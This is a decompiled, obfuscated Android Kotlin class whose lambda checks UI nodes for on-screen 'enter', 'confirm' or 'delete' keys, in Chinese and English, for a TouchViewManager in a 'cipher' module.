package com.storm.safe.rock.service.modules.cipher;

import kotlin.jvm.internal.Lambda;
import kotlin.text.AbstractC0779a1;
import p000.h10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
final class TouchViewManager$findSpecialKey$node$1 extends Lambda implements h10 {

    /* renamed from: a0 */
    public final /* synthetic */ boolean f53266a0;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public TouchViewManager$findSpecialKey$node$1(boolean z) {
        super(1);
        this.f53266a0 = z;
    }

    @Override // p000.h10
    public final Object invoke(Object obj) {
        UiObject uiObject = (UiObject) obj;
        t60.m214695b6(uiObject, "n");
        if (!uiObject.m211781a7()) {
            return Boolean.FALSE;
        }
        String strM211780a6 = uiObject.m211780a6();
        if (strM211780a6 == null) {
            strM211780a6 = "";
        }
        String strM211775a1 = uiObject.m211775a1();
        String str = strM211775a1 != null ? strM211775a1 : "";
        boolean z = false;
        if (!this.f53266a0 ? AbstractC0779a1.m213652a5(strM211780a6, "enter", true) || AbstractC0779a1.m213652a5(strM211780a6, "confirm", true) || AbstractC0779a1.m213652a5(str, "确认", false) || AbstractC0779a1.m213652a5(str, "完成", false) || str.equalsIgnoreCase("enter") : AbstractC0779a1.m213652a5(strM211780a6, "delete", true) || AbstractC0779a1.m213652a5(str, "删除", false) || str.equalsIgnoreCase("delete") || AbstractC0779a1.m213652a5(strM211780a6, "key_delete", true)) {
            z = true;
        }
        return Boolean.valueOf(z);
    }
}
